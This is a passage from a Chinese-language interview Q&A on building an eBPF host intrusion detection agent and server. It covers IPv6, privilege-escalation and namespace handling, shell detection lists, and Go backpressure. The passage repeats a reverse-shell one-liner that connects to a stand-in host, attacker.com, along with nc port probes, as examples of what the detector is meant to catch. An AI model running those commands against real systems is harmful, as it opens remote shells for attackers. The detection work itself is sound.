nc -zv target.com 22  # 检查 SSH 是否开放
nc -zv target.com 80  # 检查 HTTP 是否开放
```

3. **反向 Shell 尝试**:
```bash
# 尝试建立反向连接
bash -i >& /dev/tcp/attacker.com/4444 0>&1
# 如果攻击者未监听,连接会失败
```

**改进方案:**

```c
// 1. 添加 exit 钩子
SEC("tracepoint/syscalls/sys_exit_connect")
int trace_connect_exit(struct trace_event_raw_sys_exit *ctx) {
    long ret = ctx->ret;

    // 使用 eBPF map 存储 enter 事件信息
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;

    struct connect_info *info = bpf_map_lookup_elem(&connect_attempts, &pid);
    if (info) {
        info->success = (ret == 0);
        info->error = (ret < 0) ? -ret : 0;

        // 如果连接失败,仍然记录
        if (ret != 0) {
            event->connect_failed = 1;
            score += 10;  // 失败的连接也记录
        }
    }

    return 0;
}

// 2. 在用户态关联事件
// 根据 PID 和时间戳关联 enter 和 exit 事件
```

**风险评分调整:**

```c
// 连接成功 vs 失败
if (connect_success) {
    score += 40;  // 成功的反向 Shell 极高风险
} else {
    score += 15;  // 失败的连接尝试仍然可疑
}

// 频繁失败的连接 = 端口扫描
if (频繁失败连接) {
    score += 25;
}
```

**最佳实践:**

```c
// 1. 同时监控 connect 的 enter 和 exit
// 2. 记录连接成功/失败状态
// 3. 失败的连接也有监控价值
// 4. 检测端口扫描和服务探测
```

---

### 34. 你的 eBPF 程序在读取网络地址时使用了 sockaddr_in 结构,但如果是 IPv6 连接怎么办?

**答案:**
**当前实现只处理 IPv4,这是一个功能缺失。**

**问题代码:**

```c
// 只处理 IPv4
struct sockaddr_in *addr_in = (struct sockaddr_in *)ctx->args[1];
__be32 dst_addr = 0;
__u16 dst_port = 0;

if (addr_in) {
    bpf_probe_read_kernel(&dst_addr, sizeof(dst_addr), &addr_in->sin_addr.s_addr);
    bpf_probe_read_kernel(&dst_port, sizeof(dst_port), &addr_in->sin_port);
}
```

**IPv6 的结构:**

```c
struct sockaddr_in6 {
    __u16 sin6_family;    // AF_INET6
    __u16 sin6_port;      // 端口
    __u32 sin6_flowinfo;
    struct in6_addr sin6_addr;  // 128位 IPv6 地址
    __u32 sin6_scope_id;
};
```

**改进方案:**

```c
SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    struct sockaddr *addr = (struct sockaddr *)ctx->args[1];
    __u16 family;

    // 读取地址族
    if (bpf_probe_read_kernel(&family, sizeof(family), &addr->sa_family) != 0) {
        return 0;
    }

    event->timestamp = bpf_ktime_get_ns();

    if (family == AF_INET) {
        // IPv4
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
        __be32 ipv4_addr;
        __u16 port;

        bpf_probe_read_kernel(&ipv4_addr, sizeof(ipv4_addr), &addr_in->sin_addr.s_addr);
        bpf_probe_read_kernel(&port, sizeof(port), &addr_in->sin_port);

        event->addr_family = AF_INET;
        event->dst_addr = ipv4_addr;
        event->dst_port = port;
        event->protocol = 6;

    } else if (family == AF_INET6) {
        // IPv6
        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr;
        struct in6_addr ipv6_addr;
        __u16 port;

        bpf_probe_read_kernel(&ipv6_addr, sizeof(ipv6_addr), &addr_in6->sin6_addr);
        bpf_probe_read_kernel(&port, sizeof(port), &addr_in6->sin6_port);

        event->addr_family = AF_INET6;
        // 存储 IPv6 地址(需要扩展结构体)
        __builtin_memcpy(event->dst_addr6, &ipv6_addr, sizeof(ipv6_addr));
        event->dst_port = port;
        event->protocol = 6;

    } else {
        // 其他地址族(如 AF_UNIX)
        return 0;
    }

    return 0;
}
```

**扩展事件结构:**

```c
struct process_event {
    // ... 现有字段 ...

    // 网络相关字段(扩展)
    __u16 addr_family;        // AF_INET, AF_INET6, AF_UNIX
    __u8 protocol;           // TCP, UDP

    // IPv4 地址
    __be32 src_addr;
    __be32 dst_addr;

    // IPv6 地址
    __u8 src_addr6[16];
    __u8 dst_addr6[16];

    __u16 src_port;
    __u16 dst_port;
};
```

**风险评分调整:**

```c
// IPv4 和 IPv6 的风险评分应该一致
if (is_reverse_shell(comm)) {
    if (addr_family == AF_INET || addr_family == AF_INET6) {
        score += 40;  // 无论 IPv4 还是 IPv6,都是高风险
    }
}

// IPv6 特有的风险
if (addr_family == AF_INET6) {
    // 检测 IPv6 特定的攻击
    if (is_link_local_address(dst_addr6)) {
        // 链路本地地址,可能用于本地攻击
        score += 15;
    }
}
```

**检测其他地址族:**

```c
// Unix Domain Socket
if (family == AF_UNIX) {
    // 检测 Unix socket 连接
    // 可能用于本地进程间通信
    event->event_type = EVENT_UNIX_SOCKET;
    score += 10;
}
```

**最佳实践:**

```c
// 1. 同时支持 IPv4 和 IPv6
// 2. 使用 addr_family 字段区分
// 3. 扩展事件结构以支持 IPv6
// 4. 考虑 Unix Domain Socket
// 5. 风险评分应该一致,不依赖地址族
```

---

### 35. 为什么你的 handle_task_fix_setuid 不使用 BPF_PROG 的第二个参数 new 来获取新的 UID?

**答案:**
**这是一个实现错误,应该使用 `new` 参数而不是重复读取。**

**问题代码:**

```c
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    // ❌ 错误: 又从 old 读取 euid
    __u32 old_euid = 0;
    bpf_probe_read_kernel(&old_euid, sizeof(old_euid), &old->euid.val);

    // ❌ 错误: 又从 new 读取 euid
    __u32 new_euid = 0;
    bpf_probe_read_kernel(&new_euid, sizeof(new_euid), &new->euid.val);

    // 实际上 new 和 old 参数已经提供了这些值
    // 但 LSM 钩子传递的是指针,需要解引用
}
```

**正确的实现:**

```c
SEC("lsm/task_fix_setuid")
int BPF_PROG(handle_task_fix_setuid, struct task_struct *task, struct cred *new, struct cred *old) {
    if (!old || !new || !task) {
        return 0;
    }

    // ✅ 正确: 使用提供的参数
    __u32 old_uid, old_euid;
    __u32 new_uid, new_euid;

    // 从 cred 结构体读取(仍然需要 bpf_probe_read_kernel)
    // 因为 BPF_PROG 传递的是指针
    bpf_probe_read_kernel(&old_uid, sizeof(old_uid), &old->uid.val);
    bpf_probe_read_kernel(&old_euid, sizeof(old_euid), &old->euid.val);
    bpf_probe_read_kernel(&new_uid, sizeof(new_uid), &new->uid.val);
    bpf_probe_read_kernel(&new_euid, sizeof(new_euid), &new->euid.val);

    // 检测提权
    if ((old_uid != 0 || old_euid != 0) && (new_uid == 0 || new_euid == 0)) {
        // 记录提权事件
        event->old_uid = old_euid;
        event->new_uid = new_euid;
    }

    return 0;
}
```

**BPF_PROG 宏的工作原理:**

```c
// BPF_PROG 宏定义(简化)
#define BPF_PROG(name, args...) \
name(struct pt_regs *ctx, ##args)

// LSM 钩子的实际签名
int handle_task_fix_setuid(struct pt_regs *ctx, struct task_struct *task, struct cred *new, struct cred *old)

// BPF_PROG 宏自动解包参数
// 但仍然传递的是指针,需要通过 bpf_probe_read_kernel 读取
```

**为什么需要 bpf_probe_read_kernel?**

1. **指针可能无效**:
```
cred 结构体可能被释放
需要安全检查
```

2. **Verifier 要求**:
```
eBPF verifier 要求所有内核内存访问都经过安全函数
```

3. **跨页边界**:
```
cred 结构体可能跨越内存页
需要安全的读取方式
```

**性能考虑:**

```c
// 1. 减少重复读取
struct cred old_cred, new_cred;
if (bpf_probe_read_kernel(&old_cred, sizeof(old_cred), old) == 0 &&
    bpf_probe_read_kernel(&new_cred, sizeof(new_cred), new) == 0) {
    // 使用缓存的值
    event->old_uid = old_cred.euid.val;
    event->new_uid = new_cred.euid.val;
}

// 2. 只读取需要的字段
__u32 old_euid, new_euid;
bpf_probe_read_kernel(&old_euid, sizeof(old_euid), &old->euid.val);
bpf_probe_read_kernel(&new_euid, sizeof(new_euid), &new->euid.val);
```

**最佳实践:**

```c
// 1. 使用 BPF_PROG 提供的参数
// 2. 使用 bpf_probe_read_kernel 安全读取
// 3. 缓存读取结果,避免重复访问
// 4. 检查指针有效性
```

---

### 36. 你的 get_ppid() 函数在读取失败时返回 0,这会在时间线重建中造成什么问题?

**答案:**
**ppid = 0 会导致时间线重建失败和进程树断裂。**

**问题代码:**

```c
static __inline __u32 get_ppid() {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    struct task_struct *parent;

    if (bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent) != 0) {
        return 0;  // ❌ 返回 0
    }

    __u32 ppid;
    if (bpf_probe_read_kernel(&ppid, sizeof(ppid), &parent->tgid) != 0) {
        return 0;  // ❌ 返回 0
    }

    return ppid;
}
```

**造成的问题:**

1. **进程树断裂**:
```python
# 实际进程树
bash (1000) → sudo (1001) → ls (1002)

# 如果 sudo 的 ppid 读取失败:
bash (1000) → ls (1002)  # 丢失了 sudo
# 或者
bash (1000) → ?? (0) → ls (1002)  # ppid=0 被解释为无父进程
```

2. **时间线重建失败**:
```python
# Server 的时间线重建查询
SELECT * FROM events WHERE pid = 1002
# 返回的 ppid = 0

# 尝试查询父进程
SELECT * FROM events WHERE pid = 0
# 可能返回多个结果(所有读取失败的进程)
# 无法确定真实的父进程
```

3. **取证分析不准确**:
```python
# 无法追踪提权来源
# 无法识别攻击链
# 无法理解攻击者的行为模式
```

**改进方案:**

```c
// 1. 使用特殊值标记错误
#define PPID_ERROR 0xFFFFFFFF  // 特殊值表示读取失败

static __inline __u32 get_ppid() {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    struct task_struct *parent;

    if (bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent) != 0) {
        return PPID_ERROR;
    }

    if (parent == NULL) {
        return PPID_ERROR;
    }

    __u32 ppid;
    if (bpf_probe_read_kernel(&ppid, sizeof(ppid), &parent->tgid) != 0) {
        return PPID_ERROR;
    }

    return ppid;
}

// 2. 在事件中标记错误状态
event->ppid = get_ppid();
if (event->ppid == PPID_ERROR) {
    event->ppid_error = 1;  // 标记为错误
    event->ppid = 0;  // 兼容性
}

// 3. 用户态处理
if (event.ppid_error) {
    // 记录警告
    log.warning("Failed to read ppid for event %d", event.id)
    // 尝试其他方法重建父子关系
    // 例如: 通过时间戳和进程名推断
}
```

**错误处理策略:**

```c
// 1. 在数据库中记录错误状态
ALTER TABLE security_events ADD COLUMN ppid_error BOOLEAN DEFAULT 0;

// 2. 前端显示
if (event.ppid_error) {
    display("父进程信息不可用");
} else {
    display(`父进程: ${event.ppid}`);
}

// 3. 时间线重建时处理
if (ppid_error) {
    // 跳过该进程,或使用启发式方法
    // 例如: 查找同一时间段内可能的父进程
}
```

**最佳实践:**

```c
// 1. 使用特殊值标记错误,而不是返回 0
// 2. 在事件中记录错误状态
// 3. 用户态妥善处理错误
// 4. 提供降级方案(启发式推断)
// 5. 记录错误日志,便于调试
```

---

### 37. 为什么你的 eBPF 程序不使用 bpf_get_current_comm() 获取进程名,而使用 bpf_probe_read_kernel?

**答案:**
**实际上我的代码中两者都使用了,但用途不同。**

**代码分析:**

```c
// 方法1: 使用 bpf_get_current_comm() - 推荐
bpf_get_current_comm(&event->comm, sizeof(event->comm));

// 方法2: 使用 bpf_probe_read_kernel() - 不常用
struct task_struct *task = bpf_get_current_task();
bpf_probe_read_kernel(&event->comm, sizeof(event->comm), &task->comm);
```

**两者的区别:**

| 方法 | 优点 | 缺点 | 适用场景 |
|-----|------|------|---------|
| `bpf_get_current_comm()` | 简单、高效、安全 | 只能获取当前进程 | 获取当前进程名 |
| `bpf_probe_read_kernel()` | 灵活,可读取任意进程 | 复杂、需要安全检查 | 读取其他进程信息 |

**为什么推荐 bpf_get_current_comm()?**

1. **简化代码**:
```c
// 简单
bpf_get_current_comm(&event->comm, sizeof(event->comm));

// vs 复杂
struct task_struct *task = bpf_get_current_task();
if (bpf_probe_read_kernel(&event->comm, sizeof(event->comm), &task->comm) != 0) {
    // 错误处理
}
```

2. **更安全**:
```
bpf_get_current_comm() 内部已经处理了所有安全检查
自动处理 NULL 指针
自动处理边界检查
```

3. **性能更好**:
```
bpf_get_current_comm() 是专门优化的辅助函数
比通用的 bpf_probe_read_kernel 更快
```

4. **Verifier 友好**:
```
Verifier 认识 bpf_get_current_comm()
更容易验证通过
```

**何时使用 bpf_probe_read_kernel?**

1. **读取其他进程的信息**:
```c
// LSM 钩子提供了 task 参数
// 可以读取该任务的 comm
bpf_probe_read_kernel(&event->comm, sizeof(event->comm), &task->comm);
```

2. **需要读取其他字段**:
```c
// 除了 comm,还需要读取其他字段
bpf_probe_read_kernel(&task->pid, sizeof(task->pid), &task->pid);
```

3. **复杂的进程分析**:
```c
// 需要访问 task_struct 的多个字段
struct task_struct *task;
// 读取整个 task_struct 或多个字段
```

**最佳实践:**

```c
// 1. 获取当前进程名: 使用 bpf_get_current_comm()
bpf_get_current_comm(&event->comm, sizeof(event->comm));

// 2. 获取指定进程名: 使用 bpf_probe_read_kernel()
bpf_probe_read_kernel(&event->comm, sizeof(event->comm), &task->comm);

// 3. 统一使用 bpf_get_current_comm()(推荐)
// 除非有特殊需求,否则不要使用 bpf_probe_read_kernel()
```

---

### 38. 如果攻击者通过 setns 系统调用进入不同的网络命名空间,你的网络监控还能正常工作吗?

**答案:**
**当前实现无法正确处理网络命名空间,会导致监控盲区。**

**问题分析:**

```c
// 当前实现
SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    struct sockaddr_in *addr_in = (struct sockaddr_in *)ctx->args[1];
    // 读取地址和端口

    // 问题: 没有考虑网络命名空间
    // 如果进程在容器或独立的网络命名空间中
    // 监控到的地址可能不是真实的物理地址
}
```

**网络命名空间的影响:**

1. **容器环境**:
```bash
# 容器中的网络命名空间
docker run -it ubuntu bash
# 容器内部: 10.0.0.2
# 宿主机看到: 172.17.0.2 (或其他)
```

2. **独立命名空间**:
```bash
# 创建独立网络命名空间
ip netns add myns
ip netns exec myns bash
# 在新的命名空间中,网络配置完全独立
```

3. **VPN 和隧道**:
```bash
# VPN 创建虚拟网络命名空间
# 监控到的地址可能是虚拟地址,不是真实地址
```

**问题场景:**

```c
// 场景1: 容器中反向 Shell
docker run -it ubuntu
# 容器 IP: 10.0.0.2
bash -i >& /dev/tcp/attacker.com/4444 0>&1

// 当前监控:
// src_addr: 10.0.0.2 (容器地址)
// 实际物理地址: 192.168.1.100 (宿主机地址)
// 无法追踪到真实的物理位置

// 场景2: VPN 环境
openvpn --config client.ovpn
# VPN IP: 10.8.0.2
bash -i >& /dev/tcp/attacker.com/4444 0>&1

// 当前监控:
// src_addr: 10.8.0.2 (VPN 地址)
// 实际物理地址: 192.168.1.100 (真实地址)
// 无法追踪到真实的物理位置
```

**改进方案:**

```c
// 1. 获取网络命名空间信息
SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    struct task_struct *task = bpf_get_current_task();
    struct nsproxy *nsproxy;
    struct net *net;

    // 读取网络命名空间
    if (bpf_probe_read_kernel(&nsproxy, sizeof(nsproxy), &task->nsproxy) != 0) {
        return 0;
    }

    if (bpf_probe_read_kernel(&net, sizeof(net), &nsproxy->net_ns) != 0) {
        return 0;
    }

    // 获取命名空间 ID
    __u32 netns_id;
    bpf_probe_read_kernel(&netns_id, sizeof(netns_id), &net->ns.inum);

    event->netns_id = netns_id;  // 记录命名空间 ID

    // 读取地址信息
    // ... 现有代码 ...

    return 0;
}

// 2. 用户态映射命名空间
// 在用户态,可以查询 /proc/<pid>/ns/net
// 或使用 ip netns 命令获取命名空间信息

// 3. 记录宿主机地址
// 如果可能,获取宿主机的真实地址
// 例如: 通过 /proc/net/tcp 查询
```

**扩展事件结构:**

```c
struct process_event {
    // ... 现有字段 ...

    // 网络命名空间相关
    __u32 netns_id;        // 网络命名空间 ID
    __u32 netns_inum;      // 命名空间 inode 号

    // 地址信息(保持不变)
    __be32 src_addr;
    __be32 dst_addr;
    __u16 src_port;
    __u16 dst_port;
};
```

**风险评分调整:**

```c
// 命名空间感知的风险评分
if (netns_id != init_netns_id) {
    // 非初始命名空间,可能是容器或 VPN
    score += 10;  // 额外风险分数

    // 如果是容器 + 反向 Shell = 极高风险
    if (is_reverse_shell(comm)) {
        score += 50;
    }
}
```

**最佳实践:**

```c
// 1. 记录网络命名空间信息
// 2. 用户态映射命名空间到物理地址
// 3. 考虑命名空间的上下文
// 4. 调整风险评分
// 5. 提供命名空间视图(物理地址 vs 命名空间地址)
```

---

### 39. 你的 eBPF 程序在检测反向 shell 时只检查 bash、sh 等,如果使用 zsh、fish 等其他 shell 怎么办?

**答案:**
**实际上我的代码已经包含了 zsh、fish 等其他 shell,但仍有扩展空间。**

**当前实现:**

```c
// 检测反向Shell
__u8 is_reverse_shell = 0;
if ((comm[0] == 'b' && comm[1] == 'a' && comm[2] == 's' && comm[3] == 'h') ||
    (comm[0] == 's' && comm[1] == 'h' && comm[2] == '\0') ||
    (comm[0] == 'z' && comm[1] == 's' && comm[2] == 'h') ||
    (comm[0] == 'd' && comm[1] == 'a' && comm[2] == 's' && comm[3] == 'h')) {
    is_reverse_shell = 1;
}
```

**覆盖的 Shell:**

| Shell | 检测代码 | 状态 |
|-------|---------|------|
| bash | `bash` | ✓ |
| sh | `sh` | ✓ |
| zsh | `zsh` | ✓ |
| dash | `dash` | ✓ |
| fish | ✗ | ✗ |
| tcsh | ✗ | ✗ |
| csh | ✗ | ✗ |
| ksh | ✗ | ✗ |
| ash | ✗ | ✗ |

**改进方案:**

```c
// 1. 扩展 shell 列表
static __inline __u8 is_reverse_shell(const char *comm) {
    // 常见 shell 列表
    const char *shells[] = {
        "bash", "sh", "zsh", "dash", "fish",
        "tcsh", "csh", "ksh", "ash", "mksh",
        "rbash", "rbash", "bash4", "bash5",
        NULL
    };

    for (int i = 0; shells[i] != NULL && i < 16; i++) {
        if (comm_equals(comm, shells[i])) {
            return 1;
        }
    }

    return 0;
}

// 2. 使用 eBPF Map 存储 shell 列表
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 32);
    __type(key, char[16]);
    __type(value, __u8);
} shell_list SEC(".maps");

// 在用户态初始化
shell_list["bash"] = 1;
shell_list["sh"] = 1;
shell_list["zsh"] = 1;
// ... 其他 shell

// 在 eBPF 中查询
__u8 *is_shell = bpf_map_lookup_elem(&shell_list, &comm);
if (is_shell && *is_shell) {
    // 是 shell
}

// 3. 检测 shell 特征行为
static __inline __u8 has_shell_behavior(struct task_struct *task) {
    // 检测终端相关特征
    // 检测环境变量
    // 检测打开的文件描述符

    __u8 has_terminal = 0;
    // ... 检测逻辑 ...

    return has_terminal;
}
```

**更智能的检测:**

```c
// 不仅检查进程名,还检查行为
__u8 is_reverse_shell = 0;

// 规则1: 进程名匹配
if (is_shell_comm(comm)) {
    is_reverse_shell = 1;
}

// 规则2: 可执行文件是 shell
if (is_shell_exe(exe_path)) {
    is_reverse_shell = 1;
}

// 规则3: 有 shell 行为特征
if (has_terminal && has_network_conn) {
    is_reverse_shell = 1;
}

// 规则4: 解释器是 shell
if (interpreter == "/bin/bash" || interpreter == "/bin/sh") {
    is_reverse_shell = 1;
}
```

**动态更新机制:**

```c
// 1. 允许用户态动态更新 shell 列表
// 2. 支持正则表达式匹配
// 3. 支持自定义检测规则
// 4. 提供配置文件
```

**最佳实践:**

```c
// 1. 扩展 shell 列表,覆盖常见 shell
// 2. 不仅检测进程名,还检测行为
// 3. 支持动态更新
// 4. 提供自定义规则
// 5. 考虑解释器脚本(python, perl 等)
```

---

### 40. 为什么你的 LSM 钩子不使用 SEC("lsm/bprm_check_security") 来监控程序执行前的权限检查?

**答案:**
**这是一个设计选择,我使用了 tracepoint 而不是 LSM 钩子。**

**两种方式的对比:**

| 特性 | `tracepoint/sys_enter_execve` | `lsm/bprm_check_security` |
|-----|-------------------------------|--------------------------|
| **触发时机** | execve 系统调用进入时 | 程序执行前的权限检查 |
| **参数** | 系统调用参数 | linux_binprm 结构 |
| **灵活性** | 较低 | 较高 |
| **性能** | 较好 | 较差 |
| **权限检查** | 只监控,不干预 | 可以干预执行 |
| **复杂度** | 简单 | 复杂 |

**为什么选择 tracepoint?**

1. **简单直接**:
```c
// tracepoint: 参数清晰
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    const char *filename = (const char *)ctx->args[0];
    // 简单直接
}

// LSM: 需要解析复杂结构
SEC("lsm/bprm_check_security")
int BPF_PROG(handle_bprm_check, struct linux_binprm *bprm) {
    // 需要从 bprm 结构中提取信息
    // 更复杂
}
```

2. **性能更好**:
```
tracepoint: 轻量级,开销小
LSM: 更重的检查,开销大
```

3. **只监控,不干预**:
```
我的目标是监控,不是阻止
tracepoint 足够满足需求
```

4. **兼容性**:
```
tracepoint 在所有内核版本都可用
某些 LSM 钩子可能在旧内核中不可用
```

**何时使用 LSM 钩子?**

1. **需要阻止程序执行**:
```c
SEC("lsm/bprm_check_security")
int BPF_PROG(handle_bprm_check, struct linux_binprm *bprm) {
    const char *filename = bprm->filename;

    // 检查是否为恶意程序
    if (is_malicious(filename)) {
        return -EACCES;  // 阻止执行
    }

    return 0;
}
```

2. **需要访问更详细的信息**:
```c
// LSM 提供更多的上下文信息
struct linux_binprm {
    // 文件名
    char *filename;

    // 文件指针
    struct file *file;

    // 参数和环境变量
    const char * const *argv;
    const char * const *envp;

    // 内存管理
    struct mm_struct *mm;

    // 许可标志
    int unsafe;

    // ...
};
```

3. **需要实现复杂的访问控制**:
```c
// 基于 SELinux 策略
// 基于文件哈希
// 基于文件签名
// 基于用户上下文
```

**组合使用(推荐):**

```c
// 1. tracepoint: 监控和记录
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    // 记录所有 execve 调用
    // 低开销,高吞吐
}

// 2. LSM: 访问控制(可选)
SEC("lsm/bprm_check_security")
int BPF_PROG(handle_bprm_check, struct linux_binprm *bprm) {
    // 实施访问控制
    // 阻止恶意程序
    // 仅在需要时启用
}

// 3. 协同工作
// tracepoint 记录所有尝试
// LSM 阻止恶意尝试
// 用户态获得完整的视图
```

**最佳实践:**

```c
// 1. 监控: 使用 tracepoint
// 2. 控制: 使用 LSM(仅在需要时)
// 3. 组合使用,获得最佳效果
// 4. 测试 LSM 钩子不会影响系统稳定性
```

---

## 二、Agent 和 Server 实现相关问题 (40题)

### 41. 你的 Agent 使用了 sendSemaphore 来限制并发发送到 50,如果 Server 响应慢会发生什么?如何实现背压?

**答案:**
**当前实现会导致 goroutine 阻塞,但不会丢失事件。**

**当前实现:**

```go
var sendSemaphore = make(chan struct{}, 50) // 最多 50 个并发请求

func sendEventToServer(event *ProcessEvent) {
    sendSemaphore <- struct{}{}  // 获取信号量,如果满则阻塞
    defer func() { <-sendSemaphore }()  // 释放信号量

    // 发送事件
    resp, err := httpClient.Post(serverURL, "application/json", jsonData)
    // ...
}
```

**问题分析:**

1. **Server 响应慢**:
```go
// 如果 Server 响应慢(例如 10 秒)
// 每个请求阻塞 10 秒
// 50 个并发请求 = 500 秒的总阻塞时间
// 后续的 goroutine 会阻塞在 sendSemaphore <- struct{}{}
```

2. **Ring Buffer 填满**:
```go
// 从 ring buffer 读取事件
record, err := reader.Read()

// 立即启动 goroutine 发送
go sendEventToServer(&event)

// 如果发送慢,goroutine 会堆积
// Ring Buffer 可能被新事件填满
```

3. **内存压力**:
```go
// 每个 goroutine 占用内存(栈、事件数据等)
// 50 个阻塞的 goroutine = 约 10-20MB 内存
// 如果更多 goroutine 堆积,内存压力增大
```

**当前行为的后果:**

```
正常情况:
事件生成速度: 1000/s
发送速度: 2000/s
并发: 50
→ 无问题

Server 响应慢(200ms 响应时间):
事件生成速度: 1000/s
发送速度: 500/s (每秒只能处理 5 个请求)
并发: 50
→ 发送滞后,事件堆积,但不会丢失

Server 响应很慢(10s 响应时间):
事件生成速度: 1000/s
发送速度: 100/s
并发: 50
→ Ring Buffer 填满,新事件丢失
```

**实现背压:**

```go
// 1. 增加发送超时和重试
func sendEventToServer(event *ProcessEvent) {
    // 非阻塞获取信号量
    select {
    case sendSemaphore <- struct{}{}:
        // 成功获取信号量
    default:
        // 信号量满,实现背压
        log.Printf("Backpressure: dropping event %d", event.Pid)
        // 丢弃事件,或者放入重试队列
        return
    }
    defer func() { <-sendSemaphore }()

    // 设置较短的超时
    ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
    defer cancel()

    req, _ := http.NewRequestWithContext(ctx, "POST", serverURL, bytes.NewBuffer(jsonData))
    resp, err := httpClient.Do(req)

    if err != nil {
        if ctx.Err() == context.DeadlineExceeded {
            // 超时,快速失败
            log.Printf("Timeout sending event to server")
        }
        return
    }
    // ...
}

// 2. 使用动态调整的并发限制
type DynamicSemaphore struct {
    mu          sync.Mutex
    limit       int
    current     int
    condition   *sync.Cond
    maxLimit    int
    minLimit    int
}

func NewDynamicSemaphore(initial, min, max int) *DynamicSemaphore {
    ds := &DynamicSemaphore{
        limit:    initial,
        minLimit: min,
        maxLimit: max,
    }
    ds.condition = sync.NewCond(&ds.mu)
    return ds
}

func (ds *DynamicSemaphore) Acquire() bool {
    ds.mu.Lock()
    defer ds.mu.Unlock()

    for ds.current >= ds.limit {
        ds.condition.Wait()
    }

    ds.current++
    return true
}

func (ds *DynamicSemaphore) Release() {
    ds.mu.Lock()
    defer ds.mu.Unlock()

    ds.current--
    ds.condition.Signal()
}

// 根据响应时间动态调整并发限制
func (ds *DynamicSemaphore) AdjustByLatency(latency time.Duration) {
    ds.mu.Lock()
    defer ds.mu.Unlock()

    if latency > 5*time.Second {
        // 响应慢,减少并发
        ds.limit = max(ds.limit-10, ds.minLimit)
    } else if latency < 100*time.Millisecond {
        // 响应快,增加并发
        ds.limit = min(ds.limit+10, ds.maxLimit)
    }
}

// 3. 使用批处理减少请求次数
type EventBatch struct {
    mu     sync.Mutex
    events []ProcessEvent
    timer  *time.Timer
}

func (eb *EventBatch) Add(event ProcessEvent) {
    eb.mu.Lock()
    defer eb.mu.Unlock()

    eb.events = append(eb.events, event)

    if len(eb.events) >= 100 {
        // 批量发送
        eb.flush()
    } else if eb.timer == nil {
        // 设置定时器,100ms 后批量发送
        eb.timer = time.AfterFunc(100*time.Millisecond, eb.flush)
    }
}

func (eb *EventBatch) flush() {
    eb.mu.Lock()
    defer eb.mu.Unlock()

    if len(eb.events) == 0 {
        return
    }

    if eb.timer != nil {
        eb.timer.Stop()
        eb.timer = nil
    }

    // 批量发送
    sendBatchToServer(eb.events)
    eb.events = eb.events[:0]
}
```

**监控和告警:**

```go
// 监控背压指标
type BackpressureMetrics struct {
    DroppedEvents    atomic.Int64
    ActiveGoroutines atomic.Int64
    AvgLatency       time.Duration
    BufferFullCount  atomic.Int64
}

// 告警规则
func checkBackpressure(metrics *BackpressureMetrics) {
    if metrics.DroppedEvents.Load() > 1000 {
        log.Printf("WARNING: High event drop rate: %d", metrics.DroppedEvents.Load())
    }

    if metrics.ActiveGoroutines.Load() > 45 {
        log.Printf("WARNING: High goroutine count: %d", metrics.ActiveGoroutines.Load())
    }

    if metrics.AvgLatency > 5*time.Second {
        log.Printf("WARNING: High latency: %v", metrics.AvgLatency)
    }
}
```

**最佳实践:**

```go
// 1. 实现背压机制,避免内存耗尽
// 2. 动态调整并发限制
// 3. 使用批处理减少请求次数
// 4. 监控关键指标
// 5. 设置合理的超时和重试策略
// 6. 考虑使用消息队列(如 Kafka)解耦
```

---

### 42. Agent 在发送事件到 Server 时过滤了 localhost:8080 的连接,但如果是 Server 在不同的端口或 IP 怎么办?

**答案:**
**硬编码的过滤规则不够灵活,需要动态配置。**

**当前实现:**

```go
func sendEventToServer(event *ProcessEvent) {
    // 过滤掉发送到本地服务器的 CONNECT 事件
    if event.EventType == 4 { // EVENT_CONNECT
        // localhost (127.0.0.1) 的 IP 是 0x0100007f
        // 8080 端口是 0x901F
        if event.DstAddr == 0x0100007f && event.DstPort == 0x901F {
            return // 忽略发送到 localhost:8080 的连接
        }
    }
    // ...
}
```

**问题分析:**

1. **硬编码的 IP 和端口**:
```go
// 只过滤 127.0.0.1:8080
// 如果 Server 在其他地址或端口,无法过滤
// 例如:
// - 192.168.1.100:8080
// - localhost:9090
// - 0.0.0.0:8080
```

2. **IPv6 问题**:
```go
// 只检查 IPv4
// 如果 Server 监听在 IPv6 地址(如 ::1),无法过滤
```

3. **多 Server 场景**:
```go
// 如果有多个 Server 实例
// 需要过滤所有 Server 地址
```

**改进方案:**

```go
// 1. 从配置文件读取 Server 地址
type AgentConfig struct {
    ServerURL string `json:"server_url"`
    ServerIP  string `json:"server_ip"`
    ServerPort int  `json:"server_port"`
}

func loadConfig() (*AgentConfig, error) {
    config := &AgentConfig{}

    // 从配置文件读取
    data, err := os.ReadFile("agent_config.json")
    if err != nil {
        return nil, err
    }

    if err := json.Unmarshal(data, config); err != nil {
        return nil, err
    }

    return config, nil
}

// 2. 解析 Server URL
func parseServerURL(serverURL string) (string, int, error) {
    u, err := url.Parse(serverURL)
    if err != nil {
        return "", 0, err
    }

    host := u.Hostname()
    port, err := strconv.Atoi(u.Port())
    if err != nil {
        // 使用默认端口
        port = 80
    }

    return host, port, nil
}

// 3. 动态过滤
func sendEventToServer(event *ProcessEvent, config *AgentConfig) {
    if event.EventType == 4 { // EVENT_CONNECT
        // 检查是否为 Server 地址
        if isServerAddress(event.DstAddr, event.DstPort, config) {
            return // 忽略
        }
    }
    // ...
}

func isServerAddress(dstAddr uint32, dstPort uint16, config *AgentConfig) bool {
    // 解析 Server IP
    serverIP := net.ParseIP(config.ServerIP)
    if serverIP == nil {
        return false
    }

    // 转换为 uint32 (IPv4)
    serverIP4 := serverIP.To4()
    if serverIP4 == nil {
        // IPv6,需要不同的处理
        return false
    }

